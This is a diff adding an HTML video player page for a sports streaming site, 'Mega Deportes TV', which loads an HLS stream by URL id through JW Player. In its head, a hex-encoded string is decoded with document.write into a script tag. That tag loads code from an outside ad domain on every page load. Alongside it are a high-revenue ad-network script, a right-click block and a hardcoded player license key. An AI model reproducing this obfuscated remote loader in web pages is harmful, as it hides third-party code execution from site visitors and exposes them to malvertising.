@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<script type='text/javascript' src='//pl18476203.highrevenuecpmnetwork.com/4a/82/1c/4a821c503cb4d07ac5157eed5c93cd16.js'></script>
+<script type='text/javascript'>
+    document.oncontextmenu = function(){return false}
+</script>
+<script type="text/javascript">
+function getParameterByName(name) {
+	name = name.replace(/[\[]/, "\[").replace(/[\]]/, "\]");
+	var regex = new RegExp("[\?&]" + name + "=([^&#]*)"),
+	results = regex.exec(location.search);
+	return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+}
+
+var getID = getParameterByName('id');
+</script> 
+<script type='text/javascript'>
+var t="3c736372697074206173796e63207372633d2268747470733a2f2f616a666e65652e636f6d2f702f77615751694f6a45784e6a517a4e7a6773496e4e705a4349364d5449324e446b354d69776964326c6b496a6f304e7a6b324d444573496e4e79597949364d6e303d65794a2e6a73223e3c2f7363726970743e";for(i=0;i<t.length;i+=2){document.write(String.fromCharCode(parseInt(t.substr(i,2),16)));}
+</script> 	
+</head>   
+<style type="text/css">
+body {
+   margin: 0;
+   padding: 0;
+}
+</style>
+<meta charset="utf-8">	
+<script src="//ssl.p.jwpcdn.com/player/v/8.26.0/jwplayer.js"></script>
+<script>
+    jwplayer.key = 'XSuP4qMl+9tK17QNb+4+th2Pm9AWgMO/cYH8CI0HGGr7bdjo';
+</script>
+<body>
+<div id="player"></div>
+<script>
+var playerInstance=jwplayer("player");
+var ghttp = new XMLHttpRequest();
+ghttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+	var jsonResponse = JSON.parse(ghttp.responseText);
+		playerInstance.setup({
+		    title: "Reproductor | Mega Deportes TV",
+		     description: "megadeportes.xyz",
+			file: jsonResponse['hls'],
+			type: "hls",
+			withCredentials: true,
+			width: "100%",
+			height: "100%",
+			aspectratio: "16:9",
+			autostart: false,
+			cast: {}
+		});
+	}
+}
+ghttp.open("GET", "https://tcnt.golf/json/"+getID+".json?" + Math.random().toString(36).substring(7), true);
+ghttp.send();
+</script>
+</body>
